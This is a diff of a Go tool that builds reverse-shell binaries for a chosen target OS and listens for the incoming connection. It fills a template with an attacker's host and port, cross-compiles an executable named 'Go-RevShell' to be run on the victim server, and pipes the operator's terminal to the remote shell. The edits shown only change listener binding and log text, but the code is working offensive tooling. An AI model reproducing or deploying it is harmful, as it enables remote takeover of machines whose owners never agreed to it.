@@ -24,7 +24,7 @@ func main() {
 	host, shellPort, serverOs, listenPort := initArgs()
 	println(banner)
 	if listenPort != "0" {
-		listenTcp(listenPort)
+		listenTcp(host, listenPort)
 	} else {
 		buildReverseShell(host, shellPort, serverOs)
 	}
@@ -49,30 +49,30 @@ func buildReverseShell(host, port, serverOs string) {
 	template = bytes.ReplaceAll(template, []byte("template-host"), []byte(host))
 	template = bytes.ReplaceAll(template, []byte("template-port"), []byte(port))
 	tmpFileName, finalFileName, fileExt := "tmp.go", "Go-RevShell", ""
-	handleError("Writing template to temp file", ioutil.WriteFile(tmpFileName, template, 0600))
+	handleError("Writing template to tmp file", ioutil.WriteFile(tmpFileName, template, 0600))
 	if serverOs == "windows" {
 		fileExt = ".exe"
 	}
-	handleError("Preaparing compilation", os.Setenv("GOOS", serverOs))
+	handleError("Preaparing compilation (set GOOS to "+serverOs+")", os.Setenv("GOOS", serverOs))
 	handleError("Compiling", exec.Command("go", "build", "-o", finalFileName+fileExt, tmpFileName).Run())
-	handleError("Removing temp file", os.Remove(tmpFileName))
+	handleError("Removing tmp file after compilation", os.Remove(tmpFileName))
 	println("[+] Build is done ! The file to execute server side is \"" + finalFileName + fileExt + "\".")
 }
 
-func listenTcp(port string) {
-	listener, err := net.Listen("tcp", ":"+port)
-	handleError("Listening tcp", err)
+func listenTcp(host, port string) {
+	listener, err := net.Listen("tcp", host+":"+port)
+	handleError("TCP Listening for "+host+":"+port, err)
 	defer listener.Close()
 	connexion, err := listener.Accept()
-	handleError("Accepting connection", err)
+	handleError("Accepting TCP connection", err)
 	stdin_chan, stdout_chan := make(chan int), make(chan int)
 	go synchronizeClientServer(connexion, os.Stdout, stdout_chan)
 	go synchronizeClientServer(os.Stdin, connexion, stdin_chan)
 	select {
 	case <-stdout_chan:
-		println("[-] Remote connection is closed.")
+		println("[-] Remote connection is closed.") // Happen when closing connection from server side (with exit ie)
 	case <-stdin_chan:
-		println("[-] Local connection is closed.") // Should not happen as you are closing the connexion from the server
+		println("[-] Local connection is closed.") // Happen when closing connection with signal client side (ctrl+c ie)
 	}
 }
 
@@ -84,13 +84,13 @@ func synchronizeClientServer(source io.Reader, destination io.Writer, sync_chann
 			break
 		}
 		_, err = destination.Write(buffer[0:nBytes])
-		handleError("Write to remote", err)
+		handleError("Writing to destination (listening)", err)
 	}
 	close(sync_channel)
 }
 
 func handleError(reason string, err error) {
 	if err != nil {
-		log.Println(reason + " : " + err.Error())
+		log.Println("[ERR] " + reason + " : " + err.Error())
 	}
 }
